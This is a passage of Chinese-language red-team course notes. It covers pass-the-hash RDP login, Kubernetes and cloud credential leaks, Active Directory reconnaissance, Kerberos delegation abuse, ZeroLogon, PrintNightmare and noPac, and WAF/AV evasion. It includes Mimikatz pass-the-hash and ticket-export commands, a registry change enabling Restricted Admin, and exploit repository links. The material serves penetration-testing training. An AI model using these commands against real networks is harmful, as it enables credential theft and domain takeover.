<p>利用哈希传递登录 RDP 远程桌面<br>Windows Server 2012 R2 采用了新版的 RDP 远程桌面协议，在这个新版协议中有一个 ”受限管理员”（Restricted Admin）的特性。相信渗透测试人员和系统管理员都会对这个特性有足够的兴趣，因为通过这个特性，我们可以实现哈希传递攻击并成功登录远程桌面。在抓取到的 Hash 无法破解的情况下，如果目标主机开启了 “Restricted Admin Mode” 也行，那么我们便可以使用 Hash 来直接实现 RDP 远程登录。Restricted Admin Mode 在 Windows 8.1 和 Windows Server<br>2012 R2 上默认开启。我们在渗透过程中可以通过修改注册表的方式开启目标主机的 Restricted Admin Mode，值为 0 代表开启，值为 1 代表关闭：<br>•REG ADD “HKLM\System\CurrentControlSet\Control\Lsa” /v DisableRestrictedAdmin /t REG_DWORD /d 00000000 /fREG query “HKLM\System\CurrentControlSet\Control\Lsa” | findstr “DisableRestrictedAdmin” # 查看是否成功开启</p>
<p>Mimikatz<br>攻击机上使用 Mimikatz 进行哈希传递，大致原理就是哈希传递成功后执行<br>•mimikatz.exe # 需要管理员权限<br>•privilege::debug<br>•sekurlsa::pth /user:administrator /domain:remoteserver /ntlm:d25ecd13fddbb542d2e16da4f9e0333d “/run:mstsc.exe /restrictedadmin”</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220711170242511.png" alt="image-20220711170242511"></p>
<h2 id="云-安-全-介-绍"><a href="#云-安-全-介-绍" class="headerlink" title="云 安 全 介 绍"></a>云 安 全 介 绍</h2><p><strong>云安全相关</strong></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220711170311867.png" alt="image-20220711170311867"></p>
<p><strong>云账号AK泄露</strong></p>
<p>•API凭证（即阿里云AccessKey）是用户访问内部资源最重要的身份凭证。用户调用API时的通信加密和身份认证会使用API凭证.<br>•API凭证是云上用户调用云服务API、访问云上资源的唯一身份凭证。<br>•API凭证相当于登录密码，用于程序方式调用云服务API.</p>
<p><strong>k8s configfile泄露</strong></p>
<p>kubeconfig文件所在的位置: $HOME/.kube/config<br>Kubeconfig文件包含有关Kubernetes集群的详细信息，包括它们的位置和凭据。云厂商会给用户提供该文件,以便于用户可以通过kubectl对集群进行管理. 如果攻击者能够访问到此文件（如办公网员工机器入侵、泄露到Github的代码等），就可以直接通过API Server接管K8s集群，带来风险隐患。</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220711170447952.png" alt="image-20220711170447952"></p>
<p><strong>Master节点SSH登录泄露</strong></p>
<p>常见的容器集群管理方式是通过登录Master节点或运维跳板机，然后再通过kubectl命令工具来控制k8s。云服务器提供了通过ssh登陆的形势进行登陆master节点.若Master节点SSH连接地址泄漏,攻击者可对ssh登陆进行爆破,从而登陆上ssh,控制集群.</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220711170519084.png" alt="image-20220711170519084"></p>
<p><strong>容器组件未鉴权服务</strong></p>
<p>Kubernetes架构下常见的开放服务指纹如下，注:前六个重点关注: 一旦被控制可以直接获取相应容器、相应节点、集群权限的服务<br>•kube-apiserver: 6443, 8080<br>•kubectl proxy: 8080, 8081<br>•kubelet: 10250, 10255, 4149<br>•dashboard: 30000<br>•docker api: 2375<br>•etcd: 2379, 2380<br>•kube-controller-manager: 10252<br>•kube-proxy: 10256, 31442<br>•kube-scheduler: 10251<br>•weave: 6781, 6782, 6783</p>
<p>假如用户想在集群里面新建一个容器集合单元, 流程如下:<br>•用户与 kubectl进行交互,提出需求(例: kubectl create -f pod.yaml)<br>•kubectl 会读取 ~/.kube/config 配置，并与 apiserver 进行交互，协议：http/https<br>•apiserver 会协同 ETCD, kube-controller-manager, scheduler 等组件准备下发新建容器的配置给到节点，协议：http/https<br>•apiserver 与 kubelet 进行交互，告知其容器创建的需求，协议：http/https；<br>•kubelet 与Docker等容器引擎进行交互，创建容器，协议：http/unix socket.<br>•容器在集群节点上创建成功</p>
<p><strong>Kube-Hunter扫描漏洞</strong><br>•kube-hunter是一款用于寻找Kubernetes集群中的安全漏洞扫描器<br>•<a target="_blank" rel="noopener" href="https://github.com/aquasecurity/kube-hunter">https://github.com/aquasecurity/kube-hunter</a><br><strong>CDK</strong><br>•CDK是一款为容器环境定制的渗透测试工具，在已攻陷的容器内部提供零依赖的常用命令及PoC/EXP。集成Docker/K8s场景特有的 逃逸、横向移动、持久化利用方式，插件化管理。<br>•<a target="_blank" rel="noopener" href="https://github.com/cdk-team/CDK/wiki/CDK-Home-CN">https://github.com/cdk-team/CDK/wiki/CDK-Home-CN</a></p>
<h1 id="域渗透与免杀对抗"><a href="#域渗透与免杀对抗" class="headerlink" title="域渗透与免杀对抗"></a>域渗透与免杀对抗</h1><h2 id="域信息收集"><a href="#域信息收集" class="headerlink" title="域信息收集"></a>域信息收集</h2><p><strong>域信息收集—域相关概念</strong></p>
<p>域英文叫DOMAIN——域(Domain)是Windows网络中独立运行的单位，域之间相互访问则需要建立信任关系(即Trust Relation)。信任关系是连接在域与域之间的桥梁。当一个域与其他域建立了信任关系后，2个域之间不但可以按需要相互进行管理，还可以跨网分配文件和打印机等设备资源，使不同的域之间实现网络资源的共享与管理，以及相互通信和数据传输。域既是 Windows 网络操作系统的逻辑组织单元，也是Internet的逻辑组织单元，在Windows 网络操作系统中，域是安全边界。域管理员只能管理域的内部，除非其他的域显式地赋予他管理权限，他才能够访问或者管理其他的域，每个域都有自己的安全策略，以及它与其他域的安全信任关系。如果企业网络中计算机和用户数量较多时，要实现高效管理，就需要windows域。</p>
<p>活动目录是由组织单元、域（domain）、域树（tree）、森林（forest）构成的层次结构。域作为最基本的管理单元，同时也是最基层的容器，它可以对员工、计算机等基本数据进行存储在一个活动目录中可以根据需要建立多个域，比方说“甲公司”的财务科、人事科、销售科就可以各建一个域，因为这几个域同属甲公司，所以就可以将这几个域构成一棵域树并交给域树管理，这棵域树就是甲公司。又因为，甲公司、乙公司、丙公司都归属A集团，那么为了让A集团可以更好地管理这三家子公司，就可以将这三家公司的域树集中起来组成域森林（即A集团）。因此A集团可以按“子公司（域树）→部门→员工”的方式进行层次分明的管理。活动目录这种层次结构使企业网络具有极强的扩展性，便于组织、管理以及目录定位。</p>
<hr>
<p><strong>域信息收集—判断是否有域</strong></p>
<p>搜集完本机相关信息后，接下来，就要判断当前内网是否有域。如果有，需要判断所控主机是否在域内。下面讲解几种方法:<br>1．使用 ipconfig 命令<br>执行如下命令，可以查看网关 IP 地址、DNS 的 IP 地址、本地地址是否和 DNS 服务器为同一网段、域名等。<br>•ipconfig /all</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220716203815914.png" alt="image-20220716203815914"></p>
<p>2．查看系统详细信息<br>执行如下命令，域即域名，登录服务器为域控制器。如果域显示为WORKGROUP，表示当前服务器不在域内。当前域名为 hacke.testlab。<br>•Systeminfo</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220716203844602.png" alt="image-20220716203844602"></p>
<p>3．查询当前登录域及登录用户信息<br>执行如下命令，工作站域 DNS 名称显示域名（如果显示为 WORKGROUP，则表示非域环境）。登录域表明当前用户是域用户登录还是本地用户登录，此处表明当前用户是域用户登录。<br>•net config workstation</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220716203923311.png" alt="image-20220716203923311"></p>
<hr>
<p><strong>域信息收集–收集域内基础信息</strong></p>
<p>确定了当前内网拥有的域，并且所控制的主机在域里面，就可以进行域内相关信息的收集了。因为这些查询命令本质上都是通过 LDAP 协议去域控制器上查询的，查询时候需要经过权限认证，只有域用户才有这个权限，所以本地用户是无法运行以下命令的（system 权限用户除外。在域里面，除了普通用户，所有机器都有一个机器用户，用户名为机器名加“$”。<br>system 用户对应的就是域里面的机器用户，所以 system 权限用户是可以运行以下查询命令的）</p>
<p>1．查询域<br>查询域的命令如下：<br>•net view /domain </p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220716204044999.png" alt="image-20220716204044999"></p>
<p>2．查询此域内所有计算机<br>执行如下命令，可以通过查询得到的主机名来对主机角色进行初步判断，如图所示。例如，“dev”可能是开发服务器，“web”或者 app 可能是 Web 服务，“NAS”可能是存储服务器，“fileserver”可能是文件服务器等。<br>•net view /domain:XXX</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220716204123482.png" alt="image-20220716204123482"></p>
<p>3．查询域内所有用户组列表<br>执行如下命令，查询域内所有用户组列表:<br>•net group /domain<br>可以看到，该域含有 13 个组。系统自带的常见组如下。<br>•Domain Admins：域管理员组。<br>•Domain Computers：域内机器。<br>•Domain Controllers：域控制器。<br>•Domain Guest：域访客组，权限较低。<br>•Domain Users：域用户。<br>•Enterprise Admins：企业系统管理员用户。<br>在默认情况下，Domain Admins 和 Enterprise Admins 对域内所有域控制器有完全控制权限。</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220716204208559.png" alt="image-20220716204208559"></p>
<p>4．查询所有域成员计算机列表<br>执行如下命令，查询所有域成员计算机列表：<br>•net group “domain computers” /domain </p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220716204241961.png" alt="image-20220716204241961"></p>
<p>5．获取域密码信息<br>执行如下命令，获得域密码策略设置、密码长短、错误锁定等信息:<br>•net accounts /domain </p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220716204433198.png" alt="image-20220716204433198"></p>
<p>6．获取域信任信息<br>执行如下命令，获取域信任信息：<br>•nltest /domain_trusts</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220716204456003.png" alt="image-20220716204456003"></p>
<hr>
<p><strong>域信息收集–查找域控制器</strong></p>
<p>1．查看域内控制器的机器名<br>执行如下命令，可以看到域控制器机器名为 DC<br>•nltest /DCLIST:XXX<br>2．查看域控制器的主机名<br>执行如下命令，可以看到域控制器主机名为 dc，<br>•Nslookup -type=SRV _ldap._tcp<br>3．查看当前时间<br>一般时间服务器为主域控制器。执行如下命令，<br>•net time /domain</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220716204623816.png" alt="image-20220716204623816"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220716204633565.png" alt="image-20220716204633565"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220716204646974.png" alt="image-20220716204646974"></p>
<p>4．查看域控制器组<br>执行如下命令，查看域控制器组。有一台域控制器的机器名为 DC，<br>•net group “Domain Controllers” /domain<br>在真实环境中，一般存在两台或两台以上的域控制器，其目的是：一旦主域控制器发生故障，备用的域控制器可以使域内服务验证正常进行。执行如下命令，可以看到域控制器的机器名为 DC:<br>•netdom query pdc</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220716204740517.png" alt="image-20220716204740517"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220716204752387.png" alt="image-20220716204752387"></p>
<p>扫描内网中同时开放389和53端口的机器。<br>•端口：389<br>•服务：LDAP、ILS<br>•说明：轻型目录访问协议和NetMeeting Internet Locator Server共用这一端口<br>•端口：53<br>•服务：Domain Name Server（DNS）<br>•说明：53端口为DNS(Domain Name Server，域名服务器)服务器所开放，主要用于域名解析，DNS服务在NT系统中使用的最为广泛。通过DNS服务器可以实现域名与IP地址之间的转换，只要记住域名就可以快速访问网站。</p>
<hr>
<p><strong>域信息收集–获取域内的用户和管理员信息</strong></p>
<p>查询所有域用户列表<br>1．向域控制器进行查询<br>执行如下命令，向域控制器 DC 进行查询。域内存在四个用户，krbtgt 是用来创建票据授予服务（TGS）加密的密钥，它可以实现多种对域内持久化权限对方法，后面会一一讲解。<br>•net user /domain</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220716204933241.png" alt="image-20220716204933241"></p>
<p>2．获取域内用户详细信息<br>执行如下命令，可以获取域内用户详细信息，常见参数包括用户名、描述信息、SID、域名、状态，<br>•wmic useraccount get /all</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220716205031212.png" alt="image-20220716205031212"></p>
<p>3．查看存在的用户<br>执行如下命令，可以看到存在四个用户：<br>•dsquery user<br>常用的 dsquery 命令：<img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220716205016936.png" alt="image-20220716205016936"></p>
<p>4．查询域内置本地管理员组用户<br>执行如下命令，可以看到，本地管理员有两个用户和一个组，<br>•net localgroup administrators /domain<br>默认 Domain Admins 组为域内机器的本地管理员用户。在真实环境中，为了方便管理，会有域用户被添加为域机器的本地管理员用户。</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220716205119164.png" alt="image-20220716205119164"></p>
<p>1．查询域管理员用户<br>执行如下命令，可以看到存在两个域管理员用户。<br>•net group “domain admins” /domain</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220716205205862.png" alt="image-20220716205205862"></p>
<p>2．查询管理员用户组<br>执行如下命令，看到管理员用户为 Administrator，<br>•net group “Enterprise Admins” /domain </p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220716205242689.png" alt="image-20220716205242689"></p>
<hr>
<p><strong>域信息收集–SPN扫描</strong></p>
<p>SPN扫描<br>不同于常规的tcp/udp端口扫描，由于spn本质就是正常的Kerberos请求，所以扫描是非常隐蔽，日前针对此类扫描的检测暂时也比较少。大部分win系统默认已自带spn探测工具即：setspn.exe 此操作无需管理权限，域内机器执行:<br>•setspn -T target.com -Q <em>/</em><br>可完整查出当前域内所有spn。</p>
<hr>
<p><strong>域信息收集–域内关键组</strong></p>
<p>比如在拿到域控后可以通过重点关注关键部门人员的机器来得到更多的信息。</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220716205639152.png" alt="image-20220716205639152"></p>
<p>以上图为例，我们可以重点关注和监控运维部的用户机器，通常他们的机器上存在大量内网网络拓扑和网络构架信息或者是一些重要的密码本。</p>
<hr>
<p><strong>域信息收集–ADFind</strong></p>
<p>C++实现(未开源)，用于查询域内信息<br><a target="_blank" rel="noopener" href="http://www.joeware.net/freetools/tools/adfind/index.htm">http://www.joeware.net/freetools/tools/adfind/index.htm</a><br>常用命令如下：<br>列出域控制器名称：<br>•AdFind -sc dclist<br>查询当前域中在线的计算机：<br>•AdFind -sc computers_active<br>查询当前域中在线的计算机(只显示名称和操作系统)：<br>•AdFind -sc computers_active name operatingSystem</p>
<p>查询当前域中所有计算机(只显示名称和操作系统)：<br>•AdFind -f “objectcategory=computer” name operatingSystem<br>查询域内所有用户：<br>•AdFind -users name<br>查询所有GPO：<br>•AdFind -sc gpodmp</p>
<hr>
<p><strong>域信息收集–利用 PowerShell 收集域信息</strong></p>
<p>PowerShell 是微软推出的一款用于提高管理员对操作系统及应用程序易用性和扩展性的脚本环境，可以说是 cmd.exe 的加强版。PowerShell 作为微软官方推出的脚本语言，在 Windows 系统中的强大众所周知：在系统管理员手中，可以提高 Windows 系统管理工作的自动化程度；在渗透测试人员手中，便于渗透测试人员更好地绕过系统防护和相关反病毒软件。</p>
<p>如果想执行一个 PowerShell 脚本，需要修改 PowerShell 的默认权限为执行权限。PowerShell的常用的执行权限共有四种，具体如下。<br>•Restricted：默认设置，不允许执行任何脚本。<br>•Allsigned：只能运行经过证书验证的脚本。<br>•Unrestricted：权限最高，可以执行任意脚本。<br>•RemoteSigned：本地脚本无限制，但是对来自网络的脚本必须经过签名。<br>在 PowerShell 中输入“Get-ExecutionPolicy”，看到为默认 Restricted 权限，</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220716205843495.png" alt="image-20220716205843495"></p>
<p>将 PowerShell 执行权限改为 Unrestricted，输入“Y”</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220716205920052.png" alt="image-20220716205920052"></p>
<p>PowerView 是一款依赖 PowerShell 和 WMI 对内网域情况进行查询的常用渗透脚本。<br>PowerView 集成在 PowerSploit 工具包中，下载地址为<br>•<a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1%E3%80%82">https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1。</a><br>打开一个 PowerShell 窗口，进入 PowerSploit 目录下的 Recon 目录，输入命令<br>•Import-Module .\PowerView.ps1    成功导入脚本</p>
<p>PowerView 中的常用命令如下。<br>•Get-NetDomain：获取当前用户所在的域名称。<br>•Get-NetUser：返回所有用户的详细信息。<br>•Get-NetDomainController：获取所有域控制器。<br>•Get-NetComputer：获取所有域内机器的详细信息。<br>•Get-NetOU：获取域中的 OU 信息。<br>•Get-NetGroup：获取所有域内组和组成员信息。<br>•Get-NetFileServer：根据 SPN 获取当前域使用的文件服务器。<br>•Get-NetShare：获取当前域内所有网络共享。<br>•Get-NetSession：获取在指定服务器存在的会话信息。</p>
<p>•Get-NetRDPSession：获取在指定服务器存在的远程连接信息。<br>•Get-NetProcess：获取远程主机的进程信息。<br>•Get-UserEvent：获取指定用户的日志信息。<br>•Get-ADObject：获取活动目录的对象信息。<br>•Get-NetGPO：获取域所有组策略对象。<br>•Get-DomainPolicy：获取域默认或域控制器策略。<br>•Invoke-UserHunter：用于获取域用户登录计算机及该用户是否有本地管理权限<br>•Invoke-ProcessHunter：查找域内所有机器进程用于找到某特定用户。<br>•Invoke-UserEventHunter：根据用户日志获取某域用户登录过哪些域机器</p>
<hr>
<p><strong>域信息收集–域渗透分析工具 BloodHound</strong></p>
<p>BloodHound 是一个免费的工具。BloodHound 以用图与线的形式将域内用户、计算机、组、会话、ACL 及域内所有相关用户、组、计算机、登录信息、访问控制策略之间的关系直观地展现在 Red Team 成员面前，更便捷地分析域内情况，更快地在域内提升权限。BloodHound 也可以使Blue Team 成员对己方网络系统进行更好的安全检测，以及保证域的安全性。BloodHound 使用图形理论，自动化地在 Active Directory 环境中理清大部分人员之间的关系和细节。使用BloodHound，可以快速地深入了解 AD 中的一些用户关系、哪些用户具有管理员权限、哪些用户有权对任何计算机都拥有管理权限，以及有效的用户组成员信息。<br>Github：<a target="_blank" rel="noopener" href="https://github.com/BloodHoundAD/BloodHound">https://github.com/BloodHoundAD/BloodHound</a><br>使用wiki：<a target="_blank" rel="noopener" href="https://bloodhound.readthedocs.io/">https://bloodhound.readthedocs.io</a></p>
<h2 id="域横向手法"><a href="#域横向手法" class="headerlink" title="域横向手法"></a>域横向手法</h2><p><strong>域横向移动—ACL</strong></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220716210224569.png" alt="image-20220716210224569"></p>
<p>•域控权限（域控目的时是控制运维机）<br>•运维机（运维机目的是内网核心）<br>•内网核心以及核心业务段</p>
<hr>
<p><strong>域横向移动—GPP和SYSVOL中的密码</strong></p>
<p>•GPP被用来将通用的本地管理员密码应用于所有工作站、应用全新的管理员帐户、为其他用户安排任务、应用打印机等用途<br>•一般域内机子较多的情况，管理员为了方便管理，在主机上设置本地管理员密码GPP。配置此功能后，会在域控制器上创建一个XML文件，其中包含将策略应用于连接到域的工作站或便携式计算机时配置帐户所需的信息。<br>•该xml文件包含管理帐户的密码，一般情况下任意域用户都可以读取（通常是DC开启SYSVOL目录共享）<br>•接到域控制器的默认SYSVOL共享，并在其中搜索groups.xml的实例。如果存在这些文件，位于格式类似于以下的文件夹中：<br>•<code>\\active.local\Policies\&#123;31B2F340-016D-11D2-945F- 00C04FB984F9&#125;\MACHINE\Preferences\Groups\Groups.xml</code></p>
<hr>
<p><strong>域横向移动—Exchange</strong></p>
<p>•Exchange Windows Permissions组成员在域内具有WriteDacl权限，将该组任意集成组WriteDacl权限的成员身份中继到LDAP后，可以修改域对象的ACL授予用户更高级别的访问权限，执行DCSync<br>•就是利用Exchange默认高权限账户进行LDAP中继授予用户DCSync权限</p>
<hr>
<p><strong>域横向移动-kerberoasting</strong></p>
<p>这种攻击方法主要利用了TGS_REP阶段使用对方NTLM Hash返回的加密数据，通过碰撞加密数据破解用户密码。<br>高效率方法:</p>
<ol>
<li>查询SPN，找到有价值的SPN，需要满足以下条件：</li>
<li>该SPN注册在域用户帐户(Users)下</li>
<li>域用户账户的权限很高</li>
<li>请求TGS</li>
<li>导出TGS</li>
<li>暴力破解<br> •<a target="_blank" rel="noopener" href="https://github.com/GhostPack/Rubeus">https://github.com/GhostPack/Rubeus</a></li>
</ol>
<hr>
<p><strong>域横向移动-委派</strong></p>
<p>域委派是指，将域内用户的权限委派给服务账号，使得服务账号能以用户权限开展域内活动。需要注意的是在域内可以委派的账户有两种，一种是主机账户，另一种是服务账户(域用户通过注册SPN也可以成为服务账号)。<br>Kerberos委派主要分为三种：<br>•非约束委派(Unconstrained Delegation)<br>•约束委派(Constrained Delegation)<br>•基于资源的约束委派(Resource-Based Constrained Delegation)<br>下面简单介绍下Kerberos的各类委派，如何配置，如何发现，实战场景中如何利用。</p>
<hr>
<p><strong>域横向移动-非约束委派</strong></p>
<p>非约束委派<br>当域用户访问域内某服务时，如果该服务开启了非约束委派，用户会主动将自己已转发的的TGT发送服务，而该服务会将用户的TGT保存在内存以备下次重用，然后服务就可以利用该已转发的TGT以用户的身份访问该用户能访问的服务。非约束委派的安全问题就是如果我们找到配置了非约束委派的主机，并且通过一定手段拿下该主机的权限，我们就可以拿到所有访问过该主机用户的TGT。</p>
<p>如何配置和发现非约束委派的主机配置：</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220716210811336.png" alt="image-20220716210811336"></p>
<p>查找：<br>•AdFind.exe -b “DC=0ne,DC=test” -f  “(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))” cn distinguishedName</p>
<p>利用场景<br>当我们在域内拿到一台配置了非约束委派的主机后，就可以使用mimikatz导出所有票据，若是有其他用户访问过该主机，那么我们就可以通过ptt获取该用户权限。<br>•mimikatz.exe “privilege::debug” “sekurlsa::tickets /export” exit<br>•kerberos::ptt<br>•psexec64.exe \DC2012.0ne.test -accepteula -s cmd<br>当然我们也可以诱导域管访问该主机，例如通过给管理员发诱饵文件修改Desktop.ini，或是outlook等等。</p>
<p>非约束委派+Spooler打印机服务<br>在实战中，被动的非约束委派的利用需要和目标用户交互比较鸡肋。因此可以利用非约束委派+Spooler 打印机服务可以强制指定的主机进行连接。利用原理：利用 Windows 打印系统远程协议 (MS-RPRN) 中的一种旧的但是默认启用的方法，在该方法中，域用户可以使用 MS-RPRN RpcRemoteFindFirstPrinterChangeNotification(Ex) 方法强制任何运行了Spooler 服务的计算机以通过 Kerberos 或 NTLM 对攻击者选择的目标进行身份验证。</p>
<p>POC: <a target="_blank" rel="noopener" href="https://github.com/leechristensen/SpoolSample">https://github.com/leechristensen/SpoolSample</a><br>在WIN7主机上运行该工具，强制域控向WIN7发起认证，然后导出票据，可以看到已经获取了DC2012$的TGT，符合DCSync的利用条件[域控制器计算机帐户]：<br>•kerberos::ptt xxxx.kirbi</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220716211016871.png" alt="image-20220716211016871"></p>
<hr>
<p><strong>域横向移动-约束委派</strong></p>
<p>由于非约束委派的不安全性，微软在windows server2003中引入了约束委派，对Kerberos协议进行了拓展，引入了S4U。其中S4U支持两个子协议：<br>•Service for User to Self(S4U2self)<br>•Service for User to Proxy(S4U2proxy)<br>这两个扩展都允许服务代表用户从KDC请求票证。S4U2self可以代表自身请求针对其自身的Kerberos服务票据(ST)；S4U2proxy可以以用户的名义请求其它服务的ST，约束委派就是限制了S4U2proxy扩展的范围。配置它后，约束委派将限制指定服务可以代表用户去访问服务。该设置需要SeEnableDelegation特权，该特权很敏感，通常仅授予域管理员。约束委派的安全问题就是如果我们找到配置了约束委派的服务账号，并且通过一定手段拿下该服务账号。我们就可以利用这个服务账号代表任意用户进行S4U2self获得一个可转发的票据，然后把获取到的票据用于S42proxy(作为AddtionTicket)，从而获取一个可转发的TGS，服务就可以代替任意用户访问另外一个服务(既被配置的约束委派的服务)。</p>
<p>配置：<img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220716211151137.png" alt="image-20220716211151137"></p>
<p>查找:<br>•AdFind.exe -b “DC=0ne,DC=test” -f “(&amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))” cn distinguishedName msds-allowedtodelegateto</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220716211237197.png" alt="image-20220716211237197"></p>
<hr>
<p><strong>域横向移动—已知漏洞</strong></p>
<p>ZeroLogon(CVE-2020-1472)<br>通过利用该漏洞，可以将域控机器用户的密码置空。利用secretsdump.py来获取凭证<br>漏洞检测&amp;利用：<br>•<a target="_blank" rel="noopener" href="https://github.com/SecuraBV/CVE-2020-1472">https://github.com/SecuraBV/CVE-2020-1472</a><br>•<a target="_blank" rel="noopener" href="https://github.com/dirkjanm/CVE-2020-1472">https://github.com/dirkjanm/CVE-2020-1472</a><br>•<a target="_blank" rel="noopener" href="https://github.com/risksense/zerologon">https://github.com/risksense/zerologon</a></p>
<p>Windows Print Spooler(CVE-2021-1675)<br>Print Spooler是Windows系统中管理打印相关事务的服务，用于管理所有本地和网络打印队列并控制所有打印工作。Windows系统默认开启Print Spooler服务，普通用户可以利用此漏洞提升至SYSTEM管理权限。在域环境下，域用户可远程利用该漏洞以SYSTEM权限在域控制器上执行任意代码，从而获得整个域的控制权。<br>利用<br>•需要一个普通域用户。<br>•kali开启匿名smb共享：<br>•修改smb服务配置文件/etc/samba/smb.conf。</p>
<p>CVE-2021-42278，机器账户的名字一般来说应该以$结尾，但AD没有对域内机器账户名做验证。<br>CVE-2021-42287，与上述漏洞配合使用，创建与DC机器账户名字相同的机器账户（不以$结尾），账户请求一个TGT后，更名账户，然后通过S4U2self申请TGS Ticket，接着DC在TGS_REP阶段，这个账户不存在的时候，DC会使用自己的密钥加密TGS Ticket，提供一个属于该账户的PAC，然后我们就得到了一个高权限ST。有人也叫这个漏洞为：sAMAccountName spoofing</p>
<p>•创建一个机器账户，这在之前的文章都有所提及，使用impacket的addcomputer.py或是powermad<br>•addcomputer.py是利用SAMR协议创建机器账户，这个方法所创建的机器账户没有SPN，所以可以不用清除<br>•清除机器账户的servicePrincipalName属性<br>•将机器账户的sAMAccountName，更改为DC的机器账户名字，注意后缀不带$<br>•为机器账户请求TGT<br>•将机器账户的sAMAccountName更改为其他名字，不与步骤3重复即可<br>•通过S4U2self协议向DC请求ST<br>•DCsync</p>
<p>•<a target="_blank" rel="noopener" href="https://github.com/ASkyeye/noPac">https://github.com/ASkyeye/noPac</a><br>•<a target="_blank" rel="noopener" href="https://exploit.ph/cve-2021-42287-cve-2021-42278-weaponisation.html">https://exploit.ph/cve-2021-42287-cve-2021-42278-weaponisation.html</a><br>•<a target="_blank" rel="noopener" href="https://exploit.ph/more-samaccountname-impersonation.html">https://exploit.ph/more-samaccountname-impersonation.html</a><br>•<a target="_blank" rel="noopener" href="https://gist.github.com/ASkyeye/2c633a20d62b1754bb2f0c4d91f83a92">https://gist.github.com/ASkyeye/2c633a20d62b1754bb2f0c4d91f83a92</a><br>•<a target="_blank" rel="noopener" href="https://github.com/ASkyeye/sam-the-admin">https://github.com/ASkyeye/sam-the-admin</a><br>•<a target="_blank" rel="noopener" href="https://github.com/ASkyeye/Pachine">https://github.com/ASkyeye/Pachine</a></p>
<h2 id="waf绕过"><a href="#waf绕过" class="headerlink" title="waf绕过"></a>waf绕过</h2><p><strong>免杀概述</strong></p>
<p>•免杀是后渗透的基础<br>• 免杀是钓⻥打点的前提<br>• 现代化红蓝对抗的整个攻击周期离不开免杀<br>所以，免杀是红队人员的基本技能</p>
<hr>
<p><strong>Waf简介</strong></p>
<p>waf是web应用防火墙（Web Application Firewall）的简称，对来自Web应用程序客户端的各类请求进行内容检测和验证，确保其安全性与合法性，对非法的请求予以实时阻断，为web应用提供防护，也称作应用防火墙，是网络安全纵深防御体系里重要 的 一 环 。waf 属 于 检 测 型 及 纠 正 型 防 御 控 制 措 施 。 waf 分 为<br>•硬 件 waf<br>•软 件waf（ModSecurity）<br>•代码级waf。</p>
<hr>
<p><strong>软件型WAF</strong></p>
<p>•D盾：<a target="_blank" rel="noopener" href="http://www.d99net.net/">http://www.d99net.net</a><br>•云锁：<a target="_blank" rel="noopener" href="https://yunsuo.qianxin.com/">https://yunsuo.qianxin.com</a><br>•网防：<a target="_blank" rel="noopener" href="http://www.weishi110.cn/static/index.html">http://www.weishi110.cn/static/index.html</a><br>•安全狗：<a target="_blank" rel="noopener" href="https://www.safedog.cn/">https://www.safedog.cn</a><br>•护卫神：<a target="_blank" rel="noopener" href="https://www.hws.com/">https://www.hws.com/</a><br>•智创：<a target="_blank" rel="noopener" href="https://www.zcnt.com/">https://www.zcnt.com/</a><br>•悬镜：<a target="_blank" rel="noopener" href="https://www.xmirror.cn/">https://www.xmirror.cn/</a><br>•UPUPW：<a target="_blank" rel="noopener" href="https://www.upupw.net/">https://www.upupw.net/</a><br>•WTS-WAF：<a target="_blank" rel="noopener" href="https://www.west.cn/">https://www.west.cn/</a><br>•安骑士：<a target="_blank" rel="noopener" href="https://help.aliyun.com/product/28449.html">https://help.aliyun.com/product/28449.html</a><br>•dotDefender：<a target="_blank" rel="noopener" href="http://www.applicure.com/Products/">http://www.applicure.com/Products/</a></p>
<hr>
<p><strong>硬件型waf</strong></p>
